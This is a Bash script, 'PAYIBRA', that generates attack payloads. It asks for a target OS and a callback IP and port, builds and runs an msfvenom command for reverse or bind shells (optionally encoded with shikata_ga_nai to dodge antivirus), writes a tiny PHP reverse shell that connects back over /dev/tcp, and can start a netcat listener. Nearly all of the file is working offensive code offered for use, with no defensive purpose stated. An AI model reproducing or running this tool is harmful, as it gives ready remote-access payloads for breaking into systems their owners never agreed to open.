#!/bin/bash

# PAYIBRA - Payload Generator by Ibrahim
# Version 1.0 | 

clear

# Banner
if ! command -v figlet >/dev/null; then
    echo -e "\e[1;31m[!] 'figlet' not found. Please run: sudo apt install figlet\e[0m"
    exit 1
fi

echo -e "\e[0;32m"
figlet -c "PAY-IBRA"
echo -e "\e[0m"
echo -e "\e[0;31mPayload Generator by Ibrahim\e[0m"
echo -e "\e[0;31mVersion 1.1 | HACK WISELY\e[0m"
echo ""

echo -e "\e[1;33m=============================="
echo "     PAYLOAD CONFIGURATION"
echo -e "==============================\e[0m"

# Target OS
echo -e "\n\e[1;36mTarget OS (linux/windows/php/aspx):\e[0m"
read -p "> " TARGET

# Payload type
echo -e "\n\e[1;36mPayload type (reverse or bind):\e[0m"
read -p "> " TYPE

# LHOST
echo -e "\n\e[1;36mYour IP address (LHOST):\e[0m"
read -p "> " LHOST

# LPORT
echo -e "\n\e[1;36mPort to listen/connect back (LPORT):\e[0m"
read -p "> " LPORT

# Suggested file extension
case "$TARGET" in
  linux)   SUGG_EXT="elf" ;;
  windows) SUGG_EXT="exe" ;;
  php)     SUGG_EXT="php" ;;
  aspx)    SUGG_EXT="aspx" ;;
  *)       SUGG_EXT="bin" ;;
esac

# Output filename
echo -e "\n\e[1;36mOutput filename (example: shell.$SUGG_EXT):\e[0m"
read -p "> " OUTFILE

# Special PHP Shell Option
if [[ "$TARGET" == "php" ]]; then
  echo -e "\n\e[1;36mChoose shell type:\e[0m"
  echo "1) Meterpreter reverse shell (via Metasploit)"
  echo "2) Tiny 2-line PHP reverse shell"
  read -p "Enter 1 or 2: " PHP_TYPE
fi

# Encoder
ENCODER=""
ITER=""
if [[ "$TARGET" != "php" || "$PHP_TYPE" == "1" ]]; then
  echo -e "\n\e[1;36mEncoder (e.g., x86/shikata_ga_nai) or press Enter to skip:\e[0m"
  read -p "> " ENCODER

  echo -e "\n\e[1;36mEncoding iterations (e.g., 3) or press Enter to skip:\e[0m"
  read -p "> " ITER
fi

# Determine payload & format
if [[ "$TARGET" == "php" && "$PHP_TYPE" == "2" ]]; then
  # Generate tiny PHP shell manually
  echo "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'\"); ?>" > "$OUTFILE"
  echo -e "\n\e[1;32m[+] Tiny PHP shell saved as: $OUTFILE\e[0m"
else
  case "$TARGET" in
    linux)
      PAYLOAD="linux/x86/shell_${TYPE}_tcp"
      FORMAT="elf"
      ;;
    windows)
      PAYLOAD="windows/shell_${TYPE}_tcp"
      FORMAT="exe"
      ;;
    php)
      PAYLOAD="php/meterpreter_${TYPE}_tcp"
      FORMAT="raw"
      ;;
    aspx)
      PAYLOAD="windows/meterpreter_${TYPE}_tcp"
      FORMAT="aspx"
      ;;
    *)
      echo -e "\e[1;31m[!] Invalid OS type selected.\e[0m"
      exit 1
      ;;
  esac

  # Build msfvenom command
  CMD="msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT"
  [[ -n "$ENCODER" ]] && CMD+=" -e $ENCODER"
  [[ -n "$ITER" ]] && CMD+=" -i $ITER"
  CMD+=" -f $FORMAT -o $OUTFILE"

  # Show final command
  echo -e "\n\e[1;35mGenerated command:\e[0m"
  echo -e "\e[1;34m$CMD\e[0m"
  echo ""

  # Execute payload creation
  eval $CMD

  if [[ $? -eq 0 ]]; then
    echo -e "\n\e[1;32m[+] Payload saved as: $OUTFILE\e[0m"
  else
    echo -e "\n\e[1;31m[!] Failed to generate payload. Check your inputs.\e[0m"
    exit 1
  fi
fi

# Ask about listener
if [[ "$TYPE" == "reverse" ]]; then
  echo -e "\n\e[1;33mDo you want to start a Netcat listener on port $LPORT? (yes/no)\e[0m"
  read -p "> " START_LISTENER
  if [[ "$START_LISTENER" == "yes" ]]; then
    echo -e "\n\e[1;34m[+] Starting Netcat listener on port $LPORT...\e[0m"
    echo -e "\e[0;36m[Press CTRL+C to stop the listener]\e[0m"
    nc -lvnp $LPORT
  fi
fi
